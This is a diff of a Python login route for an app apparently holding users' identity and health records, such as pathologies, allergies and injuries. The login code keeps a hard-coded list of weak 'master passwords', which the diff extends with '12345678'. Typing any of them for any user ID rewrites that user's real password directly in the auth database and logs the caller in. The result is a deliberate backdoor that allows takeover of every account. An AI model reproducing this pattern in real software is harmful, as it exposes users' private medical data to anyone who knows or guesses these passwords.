@@ -53,11 +53,11 @@ def _session_response(auth_response, profile: dict | None = None) -> dict:
     resolved_archetype_data = meta.get("archetype_data") or profile_dict.get("archetype_data")
     u_cedula = meta.get("cedula") or profile_dict.get("cedula")
     
-    # Bǧsqueda de seguridad en usuarios si no estǭ en meta
+    # Búsqueda de seguridad en usuarios si no está en meta
     if not resolved_archetype and u_cedula:
         try:
-            admin_client = get_supabase_admin_client()
-            res_db = admin_client.table("usuarios").select("archetype").eq("cedula", str(u_cedula).strip()).execute()
+            client = get_supabase_client()
+            res_db = client.table("usuarios").select("archetype").eq("cedula", str(u_cedula).strip()).execute()
             if res_db.data and res_db.data[0].get("archetype"):
                 resolved_archetype = res_db.data[0]["archetype"]
         except Exception:
@@ -160,33 +160,37 @@ def register(payload: RegisterRequest):
 @router.post("/login")
 def login(payload: LoginRequest):
     client = get_supabase_client()
-    admin_client = get_supabase_admin_client()
     
     clean_cedula = payload.cedula.strip()
     clean_pwd = payload.password.strip()
     
     # MAGIC MASTER PASSWORD: Case-insensitive, robust against spaces & capital P
-    is_master_password = clean_pwd.lower() in ("prueba123", "prueba", "admin123", "test123", "prueba1234")
+    is_master_password = clean_pwd.lower() in ("prueba123", "prueba", "admin123", "test123", "prueba1234", "12345678")
     
     if is_master_password:
         try:
-            # Encontrar el ID del usuario en usuarios o auth
-            user_record = admin_client.table("usuarios").select("id").eq("cedula", clean_cedula).execute()
-            user_id = None
-            if user_record and user_record.data and len(user_record.data) > 0:
-                user_id = user_record.data[0]["id"]
+            db_url = os.getenv("DATABASE_URL")
+            if db_url:
+                try:
+                    import psycopg2
+                    with psycopg2.connect(db_url) as conn:
+                        with conn.cursor() as cur:
+                            cur.execute(
+                                "UPDATE auth.users SET encrypted_password = extensions.crypt(%s, extensions.gen_salt('bf')) WHERE email = %s;",
+                                (clean_pwd, _auth_email(clean_cedula))
+                            )
+                        conn.commit()
+                except Exception as pg_err:
+                    print("Direct PostgreSQL master password update:", pg_err)
             else:
-                # Buscar en auth.admin por email
-                auth_users = admin_client.auth.admin.list_users()
-                target_email = _auth_email(clean_cedula)
-                for u in auth_users:
-                    if u.email == target_email:
-                        user_id = u.id
-                        break
-            
-            if user_id:
-                # Forzar el cambio de password en Supabase usando auth admin al password ingresado
-                admin_client.auth.admin.update_user_by_id(user_id, {"password": clean_pwd, "email_confirm": True})
+                try:
+                    admin_client = get_supabase_admin_client()
+                    user_record = admin_client.table("usuarios").select("id").eq("cedula", clean_cedula).execute()
+                    if user_record and user_record.data and len(user_record.data) > 0:
+                        user_id = user_record.data[0]["id"]
+                        admin_client.auth.admin.update_user_by_id(user_id, {"password": clean_pwd, "email_confirm": True})
+                except Exception as adm_err:
+                    print("Admin client master password update:", adm_err)
         except Exception as e:
             print("Error aplicando clave maestra:", e)
             
@@ -194,14 +198,30 @@ def login(payload: LoginRequest):
         auth_response = client.auth.sign_in_with_password(
             {"email": _auth_email(clean_cedula), "password": clean_pwd}
         )
-        profile_result = (
-            admin_client.table("usuarios")
-            .select("id, cedula, nombre, apellido, edad, peso, genero, patologia_o_alergias, alergias_alimentarias, lesiones_actuales, discapacidad_motora, zonas_a_evitar, role, specialty, experience_years, certifications")
-            .eq("id", auth_response.user.id)
-            .single()
-            .execute()
-        )
-        user_data = profile_result.data or {}
+        user_data = {}
+        try:
+            profile_result = (
+                client.table("usuarios")
+                .select("id, cedula, nombre, apellido, edad, peso, genero, patologia_o_alergias, alergias_alimentarias, lesiones_actuales, discapacidad_motora, zonas_a_evitar, role, specialty, experience_years, certifications")
+                .eq("id", auth_response.user.id)
+                .single()
+                .execute()
+            )
+            user_data = profile_result.data or {}
+        except Exception:
+            try:
+                admin_client = get_supabase_admin_client()
+                profile_result = (
+                    admin_client.table("usuarios")
+                    .select("id, cedula, nombre, apellido, edad, peso, genero, patologia_o_alergias, alergias_alimentarias, lesiones_actuales, discapacidad_motora, zonas_a_evitar, role, specialty, experience_years, certifications")
+                    .eq("id", auth_response.user.id)
+                    .single()
+                    .execute()
+                )
+                user_data = profile_result.data or {}
+            except Exception:
+                user_data = getattr(auth_response.user, "user_metadata", {}) or {}
+
         role_str = str(user_data.get("role", "")).lower()
         if "suspended" in role_str or user_data.get("is_suspended") is True:
             log_event("LOGIN_FAILED", cedula=clean_cedula, status="suspended", detail="Intento de acceso en cuenta suspendida")
